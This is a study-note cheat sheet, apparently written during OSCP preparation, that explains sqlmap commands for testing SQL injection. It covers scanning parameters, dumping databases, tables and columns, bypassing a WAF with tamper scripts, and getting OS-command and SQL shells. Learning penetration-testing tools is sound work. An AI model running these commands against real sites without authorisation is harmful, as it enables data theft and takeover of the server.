# 3. sqlmap \(not for OSCP\)

### sql is not allowed in OSCP, this is just an informational page to understand how sqlmap works

I have written it such that, if required you could manually work of how an sqlmap would work for Blind SQL injection attacks.

ref : [https://resources.infosecinstitute.com/important-sqlmap-commands/\#gref](https://resources.infosecinstitute.com/important-sqlmap-commands/#gref)

We could do the following using SQLmap

* HTTP REQUESTS scanning
  * POST requests 
    * `sqlmap -u http://site-to-test.com/admin/index.php –data=”user=admin&password=admin” -p user`
  * GET requests
    * `sqlmap -u http://site-to-test.com/test.php?id=1 -p id`
* POST login page scan
  *  `sqlmap -u http://192.168.202.163/admin/index.php?id=1 –cookie=”cookie value”`
  * Sly,
    * cookie \(PHP Session\)
    *  user-agent and random-agent
    * referer
  * notice that here we have not given "`-p id`".
* CRAWL
  *  `sqlmap -u http://192.168.202.160/ –crawl=1`
* Risks and Levels
  * Risk allows the type of payloads used by the tool. By default, it uses value 1 and can be configured up to level 3. Level 3, being the maximum, includes some heavy SQL queries.
  * The level defines the number of checks/payload to be performed. The value ranges from 1 to 5. 5, being the maximum, includes large number of payloads in the scan.
  * The risk and level are recommended to be increased if SQLMap is not able to detect the injection in default settings.
* Database Enumeration
  * `–dbs`
    * To enumerate database.
    * `sqlmap -u http://site-to-test.com/test.php?id=1 --dbs`
  * `--tables` 
    * Say now we have the database name say "wp-users".
    * and we need to enumerate the number of users.
    * `sqlmap -u http://site-to-test.com/test.php?id=1 -D wp-users --tables`
  * `--columns`
    * say now we have a table name "users"
    * and we need to list all the columns present in this table.
    * `sqlmap -u http://site-to-test.com/test.php?id=1 -D wp-users -T users --columns`
  * `--dump`
    * To print all the data in table name "users".
    * `sqlmap -u http://site-to-test.com/test.php?id=1 -D wp-users -T users --dump`
  * others
    * --current-user, --current-db
    * --privileges, --roles, --is-dba, --hostname
* Bypassing a web application firewall \(WAF\)
  * --identify-waf
  * We could now use the tamper script to attack WAF
    * --tamper=apostrophemask -v 3
* Running system commands
  * `sqlmap -u http://site-to-test.com/test.php?id=1 --os-cmd id`
  * `sqlmap -u http://site-to-test.com/test.php?id=1 --os-shell`
* Running SQL interactive shell
  * `sqlmap -u http://site-to-test.com/test.php?id=1 --sql-shell`
